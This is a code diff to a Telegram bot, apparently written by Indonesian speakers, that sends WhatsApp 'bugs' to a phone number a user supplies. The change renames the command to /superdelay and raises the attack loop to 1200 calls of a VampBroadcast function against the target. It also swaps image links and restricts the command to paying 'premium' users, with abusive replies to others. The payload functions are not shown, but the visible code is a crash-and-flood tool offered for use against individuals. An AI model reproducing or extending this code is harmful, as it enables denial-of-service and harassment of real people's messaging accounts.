@@ -1306,7 +1306,7 @@ Hellow I am Bot Ranz Tele ᯤ Ready to carry out the task  友
 ╭━━━━━━━━━━━━━━━━━━
 │ Owners : @abee1945
 ╭━━━━━━━━━━━━━━━━━
-│ 語  /hardelay
+│ 語  /superdelay
 │ 語  /bakios
 │ 語  /system
 │
@@ -1517,7 +1517,7 @@ bot.onText(/\/vampori(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/vampbeta(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/superdelay(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -1528,7 +1528,7 @@ bot.onText(/\/vampbeta(?:\s(.+))?/, async (msg, match) => {
         return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
     }
     if (!match[1]) {
-        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /vampbeta 62×××.");
+        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /superdelay 62×××.");
     }
 
     const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
@@ -1538,7 +1538,7 @@ bot.onText(/\/vampbeta(?:\s(.+))?/, async (msg, match) => {
 
     const formatedNumber = numberTarget + "@s.whatsapp.net";
 
-    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
+    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
         caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
 ┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
 ┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
@@ -1546,18 +1546,17 @@ bot.onText(/\/vampbeta(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
-        await VampBeta(formatedNumber);
-        await VampCrashChat(formatedNumber);
+    for (let i = 0; i < 1200; i++) { // Kirim 3 kali langsung
+        await VampBroadcast(formatedNumber);
     }
 
-    await bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
+    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
         caption: `
 ┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
 ┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
 ┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
-┃〢 Cᴏᴍᴍᴀɴᴅ : /vampbeta
-┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
+┃〢 Cᴏᴍᴍᴀɴᴅ : /superdelay
+┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 20 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
@@ -2099,7 +2098,7 @@ bot.on("callback_query", async (callbackQuery) => {
 ╭━━━━━━━━━━━━━━━━━━
 │ Owners : @abee1945
 ╭━━━━━━━━━━━━━━━━━
-│ 語  /hardelay
+│ 語  /superdelay
 │ 語  /bakios
 │ 語  /system
 │
